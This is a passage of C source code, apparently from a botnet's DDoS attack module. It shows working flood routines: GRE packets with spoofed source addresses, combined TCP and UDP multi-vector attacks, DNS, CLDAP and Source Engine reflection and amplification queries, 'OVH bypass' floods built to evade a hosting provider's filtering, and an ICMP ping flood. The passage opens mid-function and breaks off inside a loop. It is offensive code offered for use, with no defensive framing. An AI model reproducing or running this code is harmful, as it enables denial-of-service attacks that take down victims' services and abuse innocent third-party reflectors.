    udp->len = htons(sizeof(struct udphdr) + payload_size);
    
    /* Random payload */
    rand_str((char *)(udp + 1), payload_size);
    
    /* Calculate checksums */
    inner_ip->check = 0;
    inner_ip->check = checksum_generic((uint16_t *)inner_ip, sizeof(struct iphdr) / 2);
    
    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(pktbuf);
}

/* Generate GRE Ethernet encapsulated packet */
static void send_ultimate_gre_eth(int fd, struct sockaddr_in *addr_sin,
                                  uint16_t payload_size, uint16_t dport) {
    char *pktbuf;
    int pktsize;
    uint32_t spoofed_ip;
    
    pktsize = sizeof(struct iphdr) + 4 + 6 + sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);
    
    struct iphdr *outer_ip = (struct iphdr *)pktbuf;
    uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
    uint8_t *eth = (uint8_t *)(pktbuf + sizeof(struct iphdr) + 4);
    struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4 + 6);
    
    /* Generate spoofed inner IP */
    generate_spoofed_ip(&spoofed_ip);
    
    /* Outer IP header */
    outer_ip->ihl = 5;
    outer_ip->version = 4;
    outer_ip->tos = rand_next() % 256;
    outer_ip->tot_len = htons(pktsize);
    outer_ip->protocol = IPPROTO_GRE;
    outer_ip->saddr = LOCAL_ADDR;
    outer_ip->daddr = addr_sin->sin_addr.s_addr;
    outer_ip->ttl = 64;
    outer_ip->id = rand_next();
    
    /* GRE header */
    gre[0] = 0;
    gre[1] = 0;
    gre[2] = htons(ETH_P_TEB);
    
    /* Fake Ethernet header */
    memset(eth, 0, 6); /* Destination MAC */
    
    /* Inner IP header */
    inner_ip->ihl = 5;
    inner_ip->version = 4;
    inner_ip->tos = rand_next() % 256;
    inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4 - 6);
    inner_ip->protocol = IPPROTO_UDP;
    inner_ip->saddr = spoofed_ip;
    inner_ip->daddr = addr_sin->sin_addr.s_addr;
    inner_ip->ttl = rand_next() % 256;
    inner_ip->id = rand_next();
    
    /* UDP header */
    struct udphdr *udp = (struct udphdr *)(inner_ip + 1);
    udp->source = htons(rand_next() % 0xFFFF);
    udp->dest = htons(dport != 0 ? dport : rand_next() % 0xFFFF);
    udp->len = htons(sizeof(struct udphdr) + payload_size);
    
    /* Random payload */
    rand_str((char *)(udp + 1), payload_size);
    
    /* Calculate checksums */
    inner_ip->check = 0;
    inner_ip->check = checksum_generic((uint16_t *)inner_ip, sizeof(struct iphdr) / 2);
    
    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(pktbuf);
}

/* ============================================================================
 * AXIS-TCP - TCP-Focused Combined Attack - IMPROVED WITH FRAGMENTATION & ADAPTIVE
 * Includes: TCP, OVH-TCP, ICMP, GRE-IP, GRE-ETH
 * ============================================================================ */
static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
                            struct attack_target *targs, int targs_len,
                            struct attack_option *opts, int opts_len) {
    int fd_tcp, fd_icmp, fd_gre, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size, tcp_port, gre_port, sport;
    uint32_t total_packets = 0;
    uint8_t use_fragment, use_adaptive;
    /* Weights: TCP 40%, OVH-TCP 30%, ICMP 10%, GRE-IP 10%, GRE-ETH 10% */
    uint8_t vector_weights[] = {40, 70, 80, 90, 100};
    /* Adaptive weights - adjusted based on effectiveness */
    uint8_t adaptive_weights[] = {50, 75, 85, 92, 100}; /* More TCP, less GRE */

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    tcp_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_TCP);
    gre_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_GRE);
    if (tcp_port == 0) tcp_port = rand_next() % 0xFFFF;
    if (gre_port == 0) gre_port = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;
    
    /* Check for fragmentation and adaptive flags - FUTURE IMPROVEMENTS */
    use_fragment = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_FRAGMENT);
    use_adaptive = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_ADAPTIVE);

    fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_gre = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (fd_tcp == -1 || fd_icmp == -1 || fd_gre == -1) {
        if (fd_tcp != -1) close(fd_tcp);
        if (fd_icmp != -1) close(fd_icmp);
        if (fd_gre != -1) close(fd_gre);
        return;
    }

    int opt = 1;
    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_icmp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_gre, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            uint8_t vector = rand_next() % 100;
            uint8_t *weights = use_adaptive ? adaptive_weights : vector_weights;

            if (vector < weights[0]) {
                /* TCP flood (40-50%) */
                if (use_fragment) {
                    send_fragmented_tcp(fd_tcp, &addr_sin, payload_size, tcp_port);
                } else {
                    send_ultimate_tcp(fd_tcp, &addr_sin, payload_size, tcp_port);
                }
            } else if (vector < weights[1]) {
                /* OVH-TCP (25-30%) */
                attack_ovh_tcp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[2]) {
                /* ICMP (10%) */
                send_ultimate_icmp(fd_icmp, &addr_sin, payload_size / 4);
            } else if (vector < weights[3]) {
                /* GRE IP (7-10%) */
                send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, gre_port);
            } else {
                /* GRE Ethernet (5-10%) */
                send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, gre_port);
            }
            total_packets++;
        }
    }

    close(fd_tcp);
    close(fd_icmp);
    close(fd_gre);
}

/* ============================================================================
 * AXIS-UDP - UDP-Focused Combined Attack - IMPROVED WITH ADAPTIVE WEIGHTING
 * Includes: UDP, OVH-UDP, DNS-AMP, NTP-AMP, SSDP-AMP, SNMP-AMP, CLDAP-AMP, VSE, ICMP, GRE
 * ============================================================================ */
static void attack_axis_udp(ipv4_t addr, uint8_t targs_netmask,
                            struct attack_target *targs, int targs_len,
                            struct attack_option *opts, int opts_len) {
    int fd_udp, fd_icmp, fd_gre, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size, udp_port, gre_port, sport;
    uint32_t total_packets = 0;
    uint8_t use_adaptive;
    /* Weights: UDP 20%, OVH-UDP 15%, DNS-AMP 10%, NTP-AMP 10%, SSDP-AMP 10%,
              SNMP-AMP 10%, CLDAP-AMP 5%, VSE 10%, ICMP 5%, GRE-IP 3%, GRE-ETH 2% */
    uint8_t vector_weights[] = {20, 35, 45, 55, 65, 75, 80, 90, 95, 98, 100};
    /* Adaptive weights - more amplification, less GRE */
    uint8_t adaptive_weights[] = {25, 42, 54, 66, 78, 88, 93, 96, 98, 99, 100};

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    udp_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_UDP);
    gre_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_GRE);
    if (udp_port == 0) udp_port = rand_next() % 0xFFFF;
    if (gre_port == 0) gre_port = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;
    
    /* Check for adaptive flag - FUTURE IMPROVEMENT */
    use_adaptive = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_ADAPTIVE);

    fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_gre = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (fd_udp == -1 || fd_icmp == -1 || fd_gre == -1) {
        if (fd_udp != -1) close(fd_udp);
        if (fd_icmp != -1) close(fd_icmp);
        if (fd_gre != -1) close(fd_gre);
        return;
    }

    int opt = 1;
    setsockopt(fd_udp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_icmp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_gre, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            uint8_t vector = rand_next() % 100;
            uint8_t *weights = use_adaptive ? adaptive_weights : vector_weights;

            if (vector < weights[0]) {
                /* UDP flood (20-25%) */
                send_ultimate_udp(fd_udp, &addr_sin, payload_size, udp_port);
            } else if (vector < weights[1]) {
                /* OVH-UDP (15-17%) */
                attack_ovh_udp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[2]) {
                /* DNS-AMP (10-12%) */
                attack_dns_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[3]) {
                /* NTP-AMP (10-12%) */
                attack_ntp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[4]) {
                /* SSDP-AMP (10-12%) */
                attack_ssdp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[5]) {
                /* SNMP-AMP (10%) */
                attack_snmp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[6]) {
                /* CLDAP-AMP (5%) */
                attack_cldap_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
            } else if (vector < weights[7]) {
                /* VSE (10-3%) */
                send_vse_query(fd_udp, &addr_sin, udp_port);
            } else if (vector < weights[8]) {
                /* ICMP (5-2%) */
                send_ultimate_icmp(fd_icmp, &addr_sin, payload_size / 4);
            } else if (vector < weights[9]) {
                /* GRE IP (3-1%) */
                send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, gre_port);
            } else {
                /* GRE Ethernet (2-1%) */
                send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, gre_port);
            }
            total_packets++;
        }
    }

    close(fd_udp);
    close(fd_icmp);
    close(fd_gre);
}

/* ============================================================================
 * VSE Source Engine Query Attack (NEW for AXIS-L4)
 * ============================================================================ */
static void send_vse_query(int fd, struct sockaddr_in *addr_sin, uint16_t dport) {
    char pktbuf[1024];
    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct udphdr *udph;
    char *payload;
    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + 21;
    
    util_zero(pktbuf, pktsize);
    
    /* IP header */
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();
    iph->daddr = addr_sin->sin_addr.s_addr;
    iph->ttl = 64;
    iph->id = rand_next();
    
    /* UDP header */
    udph = (struct udphdr *)(iph + 1);
    udph->source = htons(rand_next() % 0xFFFF);
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + 21);
    
    /* VSE payload: \xFF\xFF\xFF\xFF\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00 */
    payload = (char *)(udph + 1);
    payload[0] = 0xFF;
    payload[1] = 0xFF;
    payload[2] = 0xFF;
    payload[3] = 0xFF;
    payload[4] = 'T';
    payload[5] = 'S';
    payload[6] = 'o';
    payload[7] = 'u';
    payload[8] = 'r';
    payload[9] = 'c';
    payload[10] = 'e';
    payload[11] = ' ';
    payload[12] = 'E';
    payload[13] = 'n';
    payload[14] = 'g';
    payload[15] = 'i';
    payload[16] = 'n';
    payload[17] = 'e';
    payload[18] = ' ';
    payload[19] = 'Q';
    payload[20] = 'u';
    
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
    udph->check = 0;
    
    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
}

/* ============================================================================
 * DNS Query Flood (NEW for AXIS-L4)
 * ============================================================================ */
static void send_dns_query(int fd, struct sockaddr_in *addr_sin, uint16_t dport) {
    char pktbuf[512];
    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct udphdr *udph;
    char *dns_query;
    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + 44;
    
    util_zero(pktbuf, pktsize);
    
    /* IP header */
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();
    iph->daddr = addr_sin->sin_addr.s_addr;
    iph->ttl = 64;
    iph->id = rand_next();
    
    /* UDP header */
    udph = (struct udphdr *)(iph + 1);
    udph->source = htons(rand_next() % 0xFFFF);
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + 44);
    
    /* DNS query for google.com ANY */
    dns_query = (char *)(udph + 1);
    dns_query[0] = (rand_next() >> 8) & 0xFF;  /* Transaction ID */
    dns_query[1] = rand_next() & 0xFF;
    dns_query[2] = 0x01;  /* Flags: Standard query */
    dns_query[3] = 0x00;
    dns_query[4] = 0x00;  /* Questions: 1 */
    dns_query[5] = 0x01;
    dns_query[6] = 0x00;  /* Answer RRs: 0 */
    dns_query[7] = 0x00;
    dns_query[8] = 0x00;  /* Authority RRs: 0 */
    dns_query[9] = 0x00;
    dns_query[10] = 0x00; /* Additional RRs: 0 */
    dns_query[11] = 0x00;
    dns_query[12] = 0x06; /* google.com */
    dns_query[13] = 'g';
    dns_query[14] = 'o';
    dns_query[15] = 'o';
    dns_query[16] = 'g';
    dns_query[17] = 'l';
    dns_query[18] = 'e';
    dns_query[19] = 0x03;
    dns_query[20] = 'c';
    dns_query[21] = 'o';
    dns_query[22] = 'm';
    dns_query[23] = 0x00;
    dns_query[24] = 0x00; /* Type: ANY */
    dns_query[25] = 0xFF;
    dns_query[26] = 0x00; /* Class: IN */
    dns_query[27] = 0x01;
    
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
    udph->check = 0;
    
    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
}

/* ============================================================================
 * CLDAP Query Flood (NEW for AXIS-L4)
 * ============================================================================ */
static void send_cldap_query(int fd, struct sockaddr_in *addr_sin, uint16_t dport) {
    char pktbuf[256];
    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct udphdr *udph;
    char *cldap_query;
    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + 65;
    
    util_zero(pktbuf, pktsize);
    
    /* IP header */
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();
    iph->daddr = addr_sin->sin_addr.s_addr;
    iph->ttl = 64;
    iph->id = rand_next();
    
    /* UDP header */
    udph = (struct udphdr *)(iph + 1);
    udph->source = htons(rand_next() % 0xFFFF);
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + 65);
    
    /* CLDAP netlogon query */
    cldap_query = (char *)(udph + 1);
    cldap_query[0] = 0x30;
    cldap_query[1] = 0x3f;
    cldap_query[2] = 0x02;
    cldap_query[3] = 0x01;
    cldap_query[4] = 0x63;
    cldap_query[5] = 0x63;
    cldap_query[6] = 0x3a;
    cldap_query[7] = 0x04;
    cldap_query[8] = 0x00;
    cldap_query[9] = 0xa1;
    cldap_query[10] = 0x00;
    cldap_query[11] = 0xa2;
    cldap_query[12] = 0x00;
    cldap_query[13] = 0x30;
    cldap_query[14] = 0x00;
    cldap_query[15] = 0x30;
    cldap_query[16] = 0x29;
    cldap_query[17] = 0x04;
    cldap_query[18] = 0x00;
    cldap_query[19] = 0x30;
    cldap_query[20] = 0x23;
    cldap_query[21] = 0x04;
    cldap_query[22] = 0x00;
    cldap_query[23] = 0x04;
    cldap_query[24] = 0x00;
    cldap_query[25] = 0x04;
    cldap_query[26] = 0x00;
    cldap_query[27] = 0x04;
    cldap_query[28] = 0x00;
    cldap_query[29] = 0x04;
    cldap_query[30] = 0x00;
    cldap_query[31] = 0x04;
    cldap_query[32] = 0x00;
    cldap_query[33] = 0x04;
    cldap_query[34] = 0x00;
    cldap_query[35] = 0x04;
    cldap_query[36] = 0x00;
    cldap_query[37] = 0x04;
    cldap_query[38] = 0x00;
    cldap_query[39] = 0x04;
    cldap_query[40] = 0x00;
    cldap_query[41] = 0x04;
    cldap_query[42] = 0x00;
    cldap_query[43] = 0x04;
    cldap_query[44] = 0x00;
    cldap_query[45] = 0x04;
    cldap_query[46] = 0x00;
    cldap_query[47] = 0x04;
    cldap_query[48] = 0x00;
    cldap_query[49] = 0x04;
    cldap_query[50] = 0x00;
    cldap_query[51] = 0x04;
    cldap_query[52] = 0x00;
    cldap_query[53] = 0x04;
    cldap_query[54] = 0x00;
    cldap_query[55] = 0x04;
    cldap_query[56] = 0x00;
    cldap_query[57] = 0x04;
    cldap_query[58] = 0x00;
    cldap_query[59] = 0x04;
    cldap_query[60] = 0x00;
    cldap_query[61] = 0x04;
    cldap_query[62] = 0x00;
    cldap_query[63] = 0x04;
    cldap_query[64] = 0x00;
    
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
    udph->check = 0;
    
    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
}

/* ============================================================================
 * OVH TCP BYPASS
 * ============================================================================ */
static void attack_ovh_tcp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *packet;
    int packet_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->ack = TRUE;
    tcph->psh = TRUE;
    tcph->urg = TRUE;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        free(packet);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = tcph->dest;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            tcph->source = htons(sport);
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

            memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    free(packet);
    close(fd);
}

/* ============================================================================
 * OVH UDP BYPASS
 * ============================================================================ */
static void attack_ovh_udp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    
    /* OVH bypass: use DNS-like header to bypass filters */
    payload[0] = (rand_next() >> 8) & 0xFF;
    payload[1] = rand_next() & 0xFF;
    payload[2] = 0x01;  /* Standard query */
    payload[3] = 0x00;
    payload[4] = 0x00;
    payload[5] = 0x01;
    payload[6] = 0x00;
    payload[7] = 0x00;
    payload[8] = 0x00;
    payload[9] = 0x00;
    payload[10] = 0x00;
    payload[11] = 0x00;
    
    rand_str(payload + 12, payload_size - 12);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    if (sport != 0) {
        struct sockaddr_in bind_addr;
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            payload[0] = (rand_next() >> 8) & 0xFF;
            payload[1] = rand_next() & 0xFF;
            rand_str(payload + 12, payload_size - 12);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ============================================================================
 * ICMP PING FLOOD
 * ============================================================================ */
static void attack_icmp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t payload_size;
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *packet;
    int packet_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 64;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    icmph = (struct icmphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = LOCAL_ADDR;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand_next() % 0xFFFF);
    icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        free(packet);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);
            
            memcpy((char *)(icmph + 1), payload, payload_size);
            
            icmph->checksum = 0;
            icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + payload_size);
            
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    free(packet);
    close(fd);
}

/* ============================================================================
 * AXIS-L4 (Combined OVHTCP + OVHUDP + ICMP)
 * ============================================================================ */
static void attack_axis_l4(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd_tcp, fd_udp, fd_icmp, i;
    struct sockaddr_in addr_sin;
    char *payload_tcp, *payload_udp, *payload_icmp;
    uint16_t dport, sport;
    uint16_t payload_size;
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct udphdr *udph;
    struct icmphdr *icmph;
    char *packet_tcp, *packet_udp, *packet_icmp;
    int packet_size_tcp, packet_size_udp, packet_size_icmp;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    /* TCP packet */
    payload_tcp = malloc(payload_size);
    rand_str(payload_tcp, payload_size);
    packet_size_tcp = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet_tcp = malloc(packet_size_tcp);

    /* UDP packet */
    payload_udp = malloc(payload_size);
    payload_udp[0] = (rand_next() >> 8) & 0xFF;
    payload_udp[1] = rand_next() & 0xFF;
    payload_udp[2] = 0x01;
    payload_udp[3] = 0x00;
    rand_str(payload_udp + 4, payload_size - 4);
    packet_size_udp = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet_udp = malloc(packet_size_udp);

    /* ICMP packet */
    payload_icmp = malloc(64);
    rand_str(payload_icmp, 64);
    packet_size_icmp = sizeof(struct iphdr) + sizeof(struct icmphdr) + 64;
    packet_icmp = malloc(packet_size_icmp);

    /* TCP setup */
    iph = (struct iphdr *)packet_tcp;
    tcph = (struct tcphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size_tcp);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;
    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->ack = TRUE;
    tcph->psh = TRUE;
    tcph->window = htons(65535);

    /* UDP setup */
    iph = (struct iphdr *)packet_udp;
    udph = (struct udphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size_udp);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = LOCAL_ADDR;
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + payload_size);

    /* ICMP setup */
    iph = (struct iphdr *)packet_icmp;
    icmph = (struct icmphdr *)(iph + 1);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size_icmp);
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = LOCAL_ADDR;
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand_next() % 0xFFFF);

    /* Create sockets */
    fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (fd_tcp == -1 || fd_udp == -1 || fd_icmp == -1) {
        free(payload_tcp); free(payload_udp); free(payload_icmp);
        free(packet_tcp); free(packet_udp); free(packet_icmp);
        if (fd_tcp != -1) close(fd_tcp);
        if (fd_udp != -1) close(fd_udp);
        if (fd_icmp != -1) close(fd_icmp);
        return;
    }

    int opt = 1;
    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_udp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    setsockopt(fd_icmp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            /* TCP */
            iph = (struct iphdr *)packet_tcp;
            tcph = (struct tcphdr *)(iph + 1);
            iph->daddr = addr_sin.sin_addr.s_addr;
            tcph->source = htons(sport);
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            memcpy(packet_tcp + sizeof(struct iphdr) + sizeof(struct tcphdr), payload_tcp, payload_size);
            sendto(fd_tcp, packet_tcp, packet_size_tcp, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));

            /* UDP */
